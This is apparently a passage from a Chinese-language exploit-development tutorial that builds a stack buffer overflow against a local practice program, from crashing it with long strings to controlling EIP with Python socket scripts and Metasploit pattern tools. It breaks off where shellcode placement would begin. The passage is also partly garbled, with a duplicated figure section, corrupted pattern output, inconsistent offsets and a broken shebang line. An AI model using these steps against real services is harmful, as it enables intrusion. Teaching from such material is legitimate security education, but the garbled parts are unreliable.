
脚本：我们创建了一个 socket，然后将主机名设置为 localhost 的 IP 地址，并将端口设置为 8000。接下来，我们调用 `connect` 函数并指定主机和端口，这将我们连接到远程主机。对于我们的示例，我们将在连接后接收发送给我们的数据，发送 10 个 A 字符，然后接收数据并关闭 socket。

为了在我们的服务器上运行代码，我们需要重启 GDB。通过这种方式，我们使用“r”命令进行运行，如果想要重启，则回答 yes。我们将代码保存为 `exp.py`，当我们在新窗口中运行代码时，它的显示应该与图 9.3 相似。

```
File Edit View Search Terminal Help
root@kali:/tmp# python exp.py
ESP is at fffffcc2
DATA:
AAAAAAAA
root@kali:/tmp# █
```

## 9.3 执行我们的第一次漏洞利用。

当我们连接到应用程序时，它会告诉我们当前的 ESP 在哪里。接着它会请求数据，然后它会将我们提供的输出打印回来。这个例子对于熟悉漏洞利用来说超级简单。通常情况下你必须自己找出 ESP，而且程序可能不会那么容易崩溃。然而，我们的下一步是弄清楚要发送多少数据才能使其崩溃。为了做到这一点，我们将调整发送给程序的 A 字符数量。从 100 个 A 开始，不断增加发送的 A 的数量，直到 GDB 告诉你出现问题为止。当你达到 3000 个 A 时，你应该能看到与图 9.4 类似的输出。

```
root@kali:/tmp# ./exp.py
ESP is at fffccc28
DATA:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
root@kali:/tmp# 
```

```
File Edit View Search Terminal Help
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/vuln

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) 
```

## 图 9.4 我们使用漏洞程序的第一次崩溃。

我们注意到当前的执行行是 0x41414141，这在 ASCII 中是 "AAAA"。我们在这里看到了当前指令通常所在的位置，但相反，我们用 A 覆盖了 EIP。我们获得了一个很有趣的崩溃，因为控制 EIP 允许我们控制应用程序流。我们需要确定在我们的系列字符串中，EIP 是哪里被覆盖的。

## 使用 pattern_offset

Metasploit 有两个在漏洞开发过程中经常使用的辅助脚本。第一个是 `pattern_create.rb`，可以在 `/usr/share/metasploit-framework/tools/exploit/` 找到。该脚本接受一个参数：我们想要创建的缓冲区长度。第二个是 `pattern_offset.rb`，该工具将接收来自 `pattern_create.rb` 的输出并返回应用程序崩溃时 EIP 的位置。通过将 2048 指定为 `pattern_create` 的长度，我们可以生成一个字符串，用该字符串来寻找 EIP 覆盖的精确长度，并更好地了解缓冲区中存储了多少数据以备后之用。该字符串包含唯一序列的字符，这允许我们将 EIP 的值输入到另一个脚本中，以确定 EIP 被覆盖的精确长度。我们获取 `pattern_create` 输出的字符串并将其放入 `buf` 变量中。

```python
#!/usr/bin/python evenimport socket
s = socket.socket()
host = '127.0.0.1'
port = 8000
s.connect((host, port))
print(s.recv(1024))
buf="Aa0a1Aa2Aa3Aa4Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab8"
s.send(buf)
print(s.recv(1024))
s.close # Close the socket when done
```

我们的新代码替换了原始脚本中的 A。我们在 gdb 中通过输入“r”再次重新启动程序，然后运行我们新的 `exp.py`。我们可以在图 9.5 中看到结果，我们返回了部分代码作为输出，并看到 EIP 被不同的值覆盖了。

```
File Edit View Search Terminal Help

ESP is fffff28
DATA:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ab0Ac1Ac2Ac3Ac4Ac5Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ad0Ae0Ae1Ae2Ae3Ae4Ae5Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2
Af3F4F1F2F3F4F5F6F7F8F9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9
0011223Ja4Ja5Ja6Ja7Ja8Ja9Ja0Ka1Ka2Ka3Ka4Ka5Ka6Ka7Ka8Ka9Ka0La1La2La3La4La5La6La7La8La9La0An1An2An3An4An5An6An7An8An9An0Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bb0Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9C0Dd0D1D2D3D4D5D6D7D8D9D0D0De0De2De2De3De4De5D6D7D8D9D0Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9F0Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9G0G0G1G2G3G4G5G6G7G8G9G0H0H1H2H3H4H5H6H7H8H9H0J0J1J2J3J4J5J6J7J8J9J0K0K1K2K3K4K5K6K7K8K9K0L0L1L2L3L4L5L6L7L8L9L0N0N1N2N3N4N5N6N7N8N9N0
```

```
File Edit View Search Terminal Help
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/vuln

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) 
```

## 图 9.4 我们使用漏洞程序的第一次崩溃。

我们注意到当前的执行行是 0x41414141，这在 ASCII 中是 "AAAA"。我们在这里看到了当前指令通常所在的位置，但相反，我们用 A 覆盖了 EIP。我们获得了一个很有趣的崩溃，因为控制 EIP 允许我们控制应用程序流。我们需要确定在我们的系列字符串中，EIP 是哪里被覆盖的。

## 9.5 使用偏移量值确定 EIP 的位置

我们的下一步是解释这些数据。我们将通过 `pattern_offset.rb` 来完成，我们将生成的第一个字符串返回给我们，并查看 EIP。

```
root@kali:~ pattern_offset.rb
[*] match at offset 220
root@kali:~ pattern_offset.rb
[*] match at offset 268
```

我们看到字符串长度位于 1020。当加上 4 个字符时，我们程序读取的缓冲区长度为 1024。现在查看 EIP，它在 268 字节处被覆盖。

## 控制 EIP

现在我们知道 EIP 需要覆盖多少字符。我们需要验证我们的操作是正确的。我们通过构建漏洞来实现这一点，使得原始字符为 A，EIP 由 B 组成，漏洞缓冲剩余部分由 C 组成。

```python
#!/usr/bin/python
import socket
s = socket.socket()
host = '127.0.0.1'
port = 8000
eip = "BBBB"
buf = "A"*268 + eip
buf += "C"*(1024-len(buf))
s.connect((host, port))
print(s.recv(1024))
s.send(buf)
print(s.recv(1024))
s.close()
```

我们的新代码将 EIP 值设置为“BBBB”，然后创建一个 268 个字符的漏洞缓冲区，EIP 覆盖，然后用 C 填充 1024 长度的缓冲区。当我们在 gdb 中重启程序并运行新代码时，我们应该看到与图 9.6 类似的输出。

```
root@kali:~/tmp/ ./exp.py
ESP is fffffcc28
DATA:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
root@kali:~/tmp#
```

```
(gdb) r
The program being debugged has been started already.
Start from the beginning? (y or n) y
Starting program: /root/vuln

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/0x6x $esp
ffffcc20: 0x43343443  0x43343443  0x43343443  0x43343443
ffffcc30: 0x43343443  0x43343443  0x43343443  0x43343443
ffffcc40: 0x43343443  0x43343443  0x43343443  0x43343443
ffffcc50: 0x43343443  0x43343443  0x43343443  0x43343443
(gdb) 
```

## 图 9.6 验证 E 覆盖和栈数据。

在 9.6 中，我们还打印了 ESP 前 16 个十六进制值。这将显示数据是否到达了栈。我们看到了 0x43 字符，它是 C 的十六进制表示。因此我们能够覆盖我们的 EIP 值，并且栈填充了 C，我们稍后可以使用它来添加 shellcode。

我们的下一步是更改程序执行以跳转到我们想要放置 shellcode 的区域。为了这一点，我们将对程序进行另一次修改。正如我们在 9-4 的输出中看到的，程序报告的 ESP 为 0ffffcc28，而当我们打印时，它从 0ffffcc20 开始。这是因为

